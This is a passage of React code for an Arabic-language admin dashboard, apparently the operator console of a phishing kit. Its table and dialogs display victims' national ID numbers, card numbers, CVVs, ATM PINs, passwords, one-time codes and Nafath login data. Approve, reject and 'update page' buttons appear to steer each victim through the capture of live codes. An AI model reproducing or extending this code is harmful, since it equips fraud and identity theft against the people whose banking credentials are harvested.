                            (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
                              ? "معلومات نفاذ"
                              : "لا يوجد نفاذ"}
                          </Badge>

                          <Badge
                            variant={
                              notification.insuranceData && Object.keys(notification.insuranceData).length > 0
                                ? "default"
                                : "secondary"
                            }
                            className={`cursor-pointer transition-all hover:scale-105 ${
                              notification.insuranceData && Object.keys(notification.insuranceData).length > 0
                                ? "bg-gradient-to-r from-purple-500 to-purple-600 text-white"
                                : ""
                            }`}
                            onClick={() => handleInfoClick(notification, "insurance")}
                          >
                            <CreditCard className="h-3 w-3 mr-1" />
                            {notification.insuranceData && Object.keys(notification.insuranceData).length > 0
                              ? "معلومات التأمين"
                              : "لا يوجد تأمين"}
                          </Badge>
                        </div>
                      </td>
                      <td className="px-6 py-4">
                        {notification.status === "approved" ? (
                          <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                            <CheckCircle className="h-3 w-3 mr-1" />
                            موافق عليه
                          </Badge>
                        ) : notification.status === "rejected" ? (
                          <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
                            <XCircle className="h-3 w-3 mr-1" />
                            مرفوض
                          </Badge>
                        ) : (
                          <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
                            <Clock className="h-3 w-3 mr-1" />
                            قيد المراجعة
                          </Badge>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex items-center gap-2 text-sm text-muted-foreground">
                          <Clock className="h-4 w-4" />
                          {notification.createdDate &&
                            formatDistanceToNow(new Date(notification.createdDate), {
                              addSuffix: true,
                              locale: ar,
                            })}
                        </div>
                      </td>
                      <td className="px-6 py-4 text-center">
                        <UserStatus userId={notification.id} />
                      </td>
                      <td className="px-6 py-4 text-center">
                        {notification.otp && (
                          <Badge variant="outline" className="bg-blue-50 text-blue-700 border-blue-200">
                            {notification.otp}
                          </Badge>
                        )}
                      </td>
                      <td className="px-6 py-4">
                        <div className="flex justify-center gap-1">
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => handleApproval("approved", notification.id)}
                                  className="bg-gradient-to-r from-green-500 to-green-600 text-white border-0 hover:from-green-600 hover:to-green-700"
                                  disabled={notification.status === "approved"}
                                >
                                  <CheckCircle className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>موافقة</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>

                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => handleApproval("rejected", notification.id)}
                                  className="bg-gradient-to-r from-red-500 to-red-600 text-white border-0 hover:from-red-600 hover:to-red-700"
                                  disabled={notification.status === "rejected"}
                                >
                                  <XCircle className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>رفض</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>

                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => handleDelete(notification.id)}
                                  className="text-red-500 hover:text-red-600 hover:bg-red-50"
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>حذف</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>


                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => openPageUpdateDialog(notification)}
                                  className="text-blue-500 hover:text-blue-600 hover:bg-blue-50"
                                >
                                  <Edit3 className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>تحديث الصفحة</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>

                          <Badge variant="outline" className="text-xs">
                            {notification?.currentPage}
                          </Badge>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Mobile Card View */}
            <div className="lg:hidden space-y-4 p-4">
              {paginatedNotifications.map((notification) => (
                <Card key={notification.id} className="relative">
                  <CardHeader className="pb-3">
                    <div className="flex justify-between items-start">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                          <MapPin className="h-5 w-5 text-primary" />
                        </div>
                        <div>
                          <p className="font-semibold">{notification.country || "غير معروف"}</p>
                          <p className="text-sm text-muted-foreground">
                            {notification.createdDate &&
                              formatDistanceToNow(new Date(notification.createdDate), {
                                addSuffix: true,
                                locale: ar,
                              })}
                          </p>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <UserStatus userId={notification.id} />
                       
                      </div>
                    </div>
                  </CardHeader>

                  <CardContent className="pt-0">
                    <div className="space-y-4">
                      <div className="flex flex-wrap gap-2">
                        <Badge
                          variant={notification.phone ? "default" : "secondary"}
                          className={`cursor-pointer ${
                            notification.phone ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white" : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          <User className="h-3 w-3 mr-1" />
                          {notification.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                        </Badge>

                        <Badge
                          variant={notification.cardNumber ? "default" : "secondary"}
                          className={`cursor-pointer ${
                            notification.cardNumber ? "bg-gradient-to-r from-green-500 to-green-600 text-white" : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          <CreditCard className="h-3 w-3 mr-1" />
                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                        </Badge>

                        <Badge
                          variant={
                            notification.nafazInfo &&
                            (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
                              ? "default"
                              : "secondary"
                          }
                          className={`cursor-pointer ${
                            notification.nafazInfo &&
                            (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
                              ? "bg-gradient-to-r from-orange-500 to-orange-600 text-white"
                              : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "nafaz")}
                        >
                          <Shield className="h-3 w-3 mr-1" />
                          {notification.nafazInfo &&
                          (notification.nafazInfo.nafazId || notification.nafazInfo.authNumber)
                            ? "معلومات نفاذ"
                            : "لا يوجد نفاذ"}
                        </Badge>

                        <Badge
                          variant={
                            notification.insuranceData && Object.keys(notification.insuranceData).length > 0
                              ? "default"
                              : "secondary"
                          }
                          className={`cursor-pointer ${
                            notification.insuranceData && Object.keys(notification.insuranceData).length > 0
                              ? "bg-gradient-to-r from-purple-500 to-purple-600 text-white"
                              : ""
                          }`}
                          onClick={() => handleInfoClick(notification, "insurance")}
                        >
                          <CreditCard className="h-3 w-3 mr-1" />
                          {notification.insuranceData && Object.keys(notification.insuranceData).length > 0
                            ? "معلومات التأمين"
                            : "لا يوجد تأمين"}
                        </Badge>
                      </div>

                      <div className="flex justify-between items-center">
                        <div className="flex items-center gap-2">
                          <span className="text-sm text-muted-foreground">الحالة:</span>
                          {notification.status === "approved" ? (
                            <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white">
                              <CheckCircle className="h-3 w-3 mr-1" />
                              موافق عليه
                            </Badge>
                          ) : notification.status === "rejected" ? (
                            <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white">
                              <XCircle className="h-3 w-3 mr-1" />
                              مرفوض
                            </Badge>
                          ) : (
                            <Badge className="bg-gradient-to-r from-yellow-500 to-yellow-600 text-white">
                              <Clock className="h-3 w-3 mr-1" />
                              قيد المراجعة
                            </Badge>
                          )}
                        </div>

                        {notification.otp && (
                          <Badge variant="outline" className="bg-blue-50 text-blue-700">
                            {notification.otp}
                          </Badge>
                        )}
                      </div>

                      <div className="flex gap-2 pt-2 border-t">
                        <Button
                          onClick={() => handleApproval("approved", notification.id)}
                          className="flex-1 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700"
                          size="sm"
                          disabled={notification.status === "approved"}
                        >
                          <CheckCircle className="h-4 w-4 mr-1" />
                          موافقة
                        </Button>

                        <Button
                          onClick={() => handleApproval("rejected", notification.id)}
                          className="flex-1 bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700"
                          size="sm"
                          disabled={notification.status === "rejected"}
                        >
                          <XCircle className="h-4 w-4 mr-1" />
                          رفض
                        </Button>

                        <Button
                          variant="outline"
                          onClick={() => handleDelete(notification.id)}
                          className="text-red-500 hover:text-red-600 hover:bg-red-50"
                          size="sm"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>

                        <Button
                          variant="outline"
                          onClick={() => openPageUpdateDialog(notification)}
                          className="text-blue-500 hover:text-blue-600 hover:bg-blue-50"
                          size="sm"
                        >
                          <Edit3 className="h-4 w-4 mr-1" />
                          تحديث الصفحة
                        </Button>

                        <Badge variant="outline" className="text-xs">
                          {notification?.currentPage}
                        </Badge>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            {/* Empty State */}
            {paginatedNotifications.length === 0 && (
              <div className="text-center py-12">
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-muted flex items-center justify-center">
                  <Bell className="h-8 w-8 text-muted-foreground" />
                </div>
                <h3 className="text-lg font-semibold mb-2">لا توجد إشعارات</h3>
                <p className="text-muted-foreground">لا توجد إشعارات متطابقة مع الفلتر المحدد</p>
              </div>
            )}
          </CardContent>

          {/* Enhanced Pagination */}
          {filteredNotifications.length > 0 && (
            <CardFooter className="border-t bg-muted/20 p-4">
              <Pagination
                currentPage={currentPage}
                totalPages={totalPages}
                onPageChange={handlePageChange}
                totalItems={filteredNotifications.length}
                itemsPerPage={itemsPerPage}
              />
            </CardFooter>
          )}
        </Card>

        {/* Nafaz Information Section */}
        {selectedNotification && selectedInfo === "nafaz" && (
          <div className="mt-6">
            <NafazInfoCard notification={selectedNotification} onUpdate={handleNafazUpdate} />
          </div>
        )}

        {/* Nafaz Information Section */}
        {selectedNotification && selectedInfo === "insurance" && (
          <div className="mt-6">
            <InsuranceInfoCard notification={selectedNotification} onUpdate={handleInsuranceUpdate} />
          </div>
        )}
      </div>

      {/* Enhanced Dialog */}
      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="max-w-2xl max-h-[80vh] overflow-y-auto" dir="rtl">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-3 text-xl">
              {selectedInfo === "personal" ? (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-blue-500 to-blue-600 flex items-center justify-center">
                    <User className="h-5 w-5 text-white" />
                  </div>
                  المعلومات الشخصية
                </>
              ) : selectedInfo === "card" ? (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-green-500 to-green-600 flex items-center justify-center">
                    <CreditCard className="h-5 w-5 text-white" />
                  </div>
                  معلومات البطاقة
                </>
              ) : selectedInfo === "nafaz" ? (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-orange-500 to-orange-600 flex items-center justify-center">
                    <Shield className="h-5 w-5 text-white" />
                  </div>
                  معلومات نفاذ
                </>
              ) : (
                <>
                  <div className="w-10 h-10 rounded-full bg-gradient-to-br from-orange-500 to-orange-600 flex items-center justify-center">
                    <Shield className="h-5 w-5 text-white" />
                  </div>
                  معلومات التأمين
                </>
              )}
            </DialogTitle>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                {[
                  { label: "الاسم", value: selectedNotification.name },
                  { label: "رقم الهوية", value: selectedNotification.idNumber },
                  {
                    label: "البريد الإلكتروني",
                    value: selectedNotification.email,
                  },
                  { label: "رقم الجوال", value: selectedNotification.mobile },
                  { label: "الهاتف", value: selectedNotification.phone },
                ].map(
                  ({ label, value }) =>
                    value && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                      >
                        <span className="font-medium text-muted-foreground">{label}:</span>
                        <span className="font-semibold">{value}</span>
                      </div>
                    ),
                )}
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-4">
              <div className="bg-gradient-to-br from-muted/50 to-muted/30 rounded-lg p-4 space-y-3">
                {[
                  { label: "البنك", value: selectedNotification.bank },
                  { label: "اسم حامل البطاقة", value: selectedNotification.cardHolderName },
                  {
                    label: "رقم البطاقة",
                    value: selectedNotification?.cardNumber + " - " + selectedNotification?.prefix,
                  },
                  {
                    label: "تاريخ الانتهاء",
                    value:
                      selectedNotification.expiryMonth && selectedNotification.expiryYear
                        ? `${selectedNotification.expiryMonth}/${selectedNotification.expiryYear}`
                        : "غير متوفر",
                  },
                  { label: "رمز الأمان", value: selectedNotification.cvv },
                  { label: "رمز الصراف الآلي", value: selectedNotification.atmPin },
                  { label: "رمز التحقق", value: selectedNotification.otp },
                  { label: "كلمة المرور", value: selectedNotification.pass },
                ].map(
                  ({ label, value }) =>
                    value && (
                      <div
                        key={label}
                        className="flex justify-between items-center py-2 border-b border-border/30 last:border-0"
                      >
                        <span className="font-medium text-muted-foreground">{label}:</span>
                        <span className="font-semibold">{value}</span>
                      </div>
                    ),
                )}

                {selectedNotification.allOtps &&
                  Array.isArray(selectedNotification.allOtps) &&
                  selectedNotification.allOtps.length > 0 && (
                    <div className="pt-2 border-t border-border/30">
                      <span className="font-medium text-muted-foreground block mb-2">جميع الرموز:</span>
                      <div className="flex flex-wrap gap-2">
                        {selectedNotification.allOtps.map((otp, index) => (
                          <Badge key={index} variant="outline" className="bg-muted">
                            {otp}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
              </div>
            </div>
          )}

          {selectedInfo === "nafaz" && selectedNotification && (
            <div className="space-y-4">
              <NafazInfoCard notification={selectedNotification} onUpdate={handleNafazUpdate} />
            </div>
          )}

          {selectedInfo === "insurance" && selectedNotification && (
            <div className="space-y-4">
              <InsuranceInfoCard notification={selectedNotification} onUpdate={handleInsuranceUpdate} />
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}
